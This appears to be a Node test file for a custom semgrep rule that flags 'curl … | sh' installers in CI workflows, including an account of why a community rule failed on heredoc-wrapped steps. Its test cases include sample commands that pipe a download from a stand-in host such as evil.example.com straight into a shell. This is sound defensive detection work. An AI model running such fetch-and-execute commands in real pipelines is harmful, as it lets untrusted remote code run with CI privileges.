// Tests for security/sast/rules/belay-ci-curl-pipe-shell.yaml, the replacement for a community rule
// that goes BLIND on heredoc-wrapped workflow steps. Ported from MovieCollectionManager (MCM), where
// it guarded mcm-ci-curl-pipe-shell (MCM item #224).
//
// WHY A CUSTOM RULE EXISTS AT ALL. `p/owasp-top-ten` ships
// `yaml.github-actions.security.gha-curl-pipe-shell`, which re-parses a step's `run:` block as Bash
// via `metavariable-pattern`. BELAY wraps its run-steps in the ci-log-step heredoc, which that
// sub-parser cannot read, so it aborts on the block instead of matching inside it. MCM measured it on
// 2026-09-06 against semgrep@1.169.0: 36 errors, ALL attributed to that one rule, and 0 findings from
// it, while six `curl … | sh` lines sat in the workflows untouched. A rule that has gone blind and a
// rule that has been remediated are indistinguishable from the gate's output.
//
// The replacement is deliberately TEXT-LEVEL (`pattern-regex` / `pattern-not-regex`, no
// `metavariable-pattern`), so no sub-parser is ever invoked and the heredoc wrapper is irrelevant.
//
// This test applies the rule's own regexes rather than restating them, so there is one definition.
// It is line-oriented where semgrep is file-oriented; the two agree here because both patterns
// forbid a newline inside the match, so every hit is confined to a single line by construction.
// `node scripts/sast-scan.mjs --test-rules` runs the rule itself, through semgrep, over its fixture.
//
// Runs in CI under `pnpm nx run scripts:test`: offline, token-free, node built-ins plus `yaml`.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, readFileSync, readdirSync } from 'node:fs';
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { parse as parseYaml } from 'yaml';

const REPO_ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '../..');
const RULE_PATH = resolve(REPO_ROOT, 'security/sast/rules/belay-ci-curl-pipe-shell.yaml');
const WORKFLOW_DIR = resolve(REPO_ROOT, '.forgejo/workflows');

const rule = parseYaml(readFileSync(RULE_PATH, 'utf8')).rules[0];

/** The rule's two halves, read from the rule itself so there is no second copy of either regex. */
function patternsOf(r) {
  const clauses = r.patterns ?? [];
  const find = (key) => clauses.find((c) => key in c)?.[key];
  const positive = find('pattern-regex');
  const negative = find('pattern-not-regex');
  assert.ok(positive, 'rule must carry a pattern-regex (the text-level match)');
  assert.ok(negative, 'rule must carry a pattern-not-regex (the accepted pinned installers)');
  return { positive: new RegExp(positive), negative: new RegExp(negative) };
}

const { positive, negative } = patternsOf(rule);

/** True iff semgrep would report this line: the positive matches and no exception covers it. */
const flags = (line) => positive.test(line) && !negative.test(line);

const workflowLines = () => {
  const out = [];
  for (const name of readdirSync(WORKFLOW_DIR).filter((n) => /\.ya?ml$/.test(n))) {
    const text = readFileSync(resolve(WORKFLOW_DIR, name), 'utf8');
    text.split(/\r?\n/).forEach((line, i) => out.push({ file: name, line: i + 1, text: line }));
  }
  return out;
};

// ── The rule sees the code the blinded one could not ─────────────────────────

test('the rule matches the curl-pipe-shell installer the sast job actually contains', () => {
  const hits = workflowLines().filter((l) => positive.test(l.text));
  // A regex that matched nothing would pass every acceptance test below vacuously. The blinded
  // community rule's 0 findings looked exactly like a clean repo.
  assert.ok(
    hits.some((h) => h.file === 'guardrails.yml'),
    `expected the pattern to see the heredoc-wrapped uv installer in guardrails.yml (matched: ${hits.map((h) => `${h.file}:${h.line}`).join(', ') || 'nothing'})`,
  );
});

test('no workflow line is flagged today: main stays green on the accepted pinned installer', () => {
  const flagged = workflowLines().filter((l) => flags(l.text));
  assert.deepEqual(
    flagged.map((l) => `${l.file}:${l.line}`),
    [],
    'a workflow line is not covered by the rule\'s accepted-installer list. Either pin/replace the ' +
      'installer, or add it to pattern-not-regex WITH a comment saying why it is accepted.',
  );
});

// ── What the rule must still catch ───────────────────────────────────────────

test('an unknown host piping to a shell is caught', () => {
  assert.ok(flags('          curl -LsSf https://evil.example.com/install.sh | sh'));
  assert.ok(flags('          curl -Ls https://example.invalid/setup | bash'));
});

test('an UNPINNED version of the accepted installer is caught; the pinned one is accepted', () => {
  assert.ok(
    flags('          curl -LsSf https://astral.sh/uv/install.sh | sh'),
    'the unversioned astral.sh uv installer must be caught: the acceptance is for a PINNED version',
  );
  assert.ok(!flags('          curl -LsSf https://astral.sh/uv/0.13.9/install.sh | sh'));
});

test('the installers MCM accepted for stages BELAY has not reached are caught', () => {
  // rustup (stage 2) and Maestro (a mobile E2E surface) are added, with their reasons, when needed.
  assert.ok(flags("          curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y"));
  assert.ok(flags('          curl -Ls https://get.maestro.mobile.dev | bash'));
});

test('a curl that is not piped into a shell is not flagged', () => {
  assert.ok(!flags('          curl -sSfL https://example.com/data.json -o data.json'));
  assert.ok(!flags('          curl -s https://example.com/x | jq .name'));
});

// ── The property that made the community rule useless ────────────────────────

test('the rule never re-parses the run block, so the ci-log-step heredoc cannot blind it', () => {
  assert.ok(
    !JSON.stringify(rule).includes('metavariable-pattern'),
    'metavariable-pattern re-parses the step body in a sub-language: that is what blinded ' +
      'gha-curl-pipe-shell (36 parse errors, 0 findings). Keep this rule text-level.',
  );
  assert.ok(
    positive.test('          curl -LsSf https://astral.sh/uv/install.sh | sh'),
    'the pattern must match a line lifted straight out of a CI_LOG_STEP heredoc body',
  );
});

// ── Wiring: a rule that does not block, or is not scoped, is not a control ────

test('the rule blocks and is scoped to workflow files', () => {
  assert.equal(rule.id, 'belay-ci-curl-pipe-shell');
  assert.equal(rule.severity, 'ERROR', 'ERROR normalizes to High, which is what makes the gate fail');
  const include = rule.paths?.include ?? [];
  assert.ok(include.some((p) => p.includes('.forgejo/workflows')), 'the rule must be scoped to the workflow trees');
});

test('the blinded community rule is not carried as a live allowlist entry', () => {
  // Its entry would suppress nothing (the rule cannot run) and report UNMATCHED for ever, which reads
  // as "remediated already". This rule replaces it.
  const path = resolve(REPO_ROOT, 'security/sast/allowlist.yaml');
  const allowlist = existsSync(path) ? (parseYaml(readFileSync(path, 'utf8')) ?? []) : [];
  const dead = (Array.isArray(allowlist) ? allowlist : []).filter((e) => String(e?.id).includes('gha-curl-pipe-shell'));
  assert.deepEqual(dead, []);
});
